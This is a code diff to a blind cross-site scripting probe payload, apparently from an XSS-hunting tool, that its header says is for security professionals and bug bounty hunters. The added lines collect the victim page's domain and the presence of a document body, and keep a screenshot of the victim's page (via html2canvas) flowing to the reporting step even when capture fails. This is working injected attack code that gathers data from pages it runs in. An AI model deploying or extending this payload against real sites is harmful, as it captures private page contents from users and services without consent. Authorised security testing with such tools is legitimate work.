@@ -20,7 +20,7 @@ $$ |      $$ |\$$$$$$$\ \$$$$$$$ |$$$$$$$  |\$$$$$$$\       $$ |  $$ |\$$$$$$$\ 
 
 This is a payload to test for Cross-site Scripting (XSS). It is meant to be used by security professionals and bug bounty hunters.
 
-If you believe that this payload has been used to attempt to comprimise your service without permission, please contact us.
+If you believe that this payload has been used to attempt to compromise your service without permission, please contact us.
 */
 
 // https://github.com/niklasvh/html2canvas
@@ -153,7 +153,18 @@ function addEvent(element, eventName, fn) {
 
 probe_return_data = {};
 
+if( document.body ) {
+    probe_return_data["document-body"] = true;
+} else {
+    probe_return_data["document-body"] = false;
+}
+
 // Prevent failure incase the browser refuses to give us any of the probe data.
+try {
+    probe_return_data['domain'] = never_null( document.domain );
+} catch ( e ) {
+    probe_return_data['domain'] = '';
+}
 try {
     probe_return_data['uri'] = never_null( location.toString() );
 } catch ( e ) {
@@ -204,6 +215,9 @@ function hook_load_if_not_ready() {
         }
         html2canvas(document.body).then(function(canvas) {
             probe_return_data['screenshot'] = canvas.toDataURL();
+            finishing_moves();
+        },function() {
+            probe_return_data['screenshot'] = '';
             finishing_moves();
         });
     } catch( e ) {
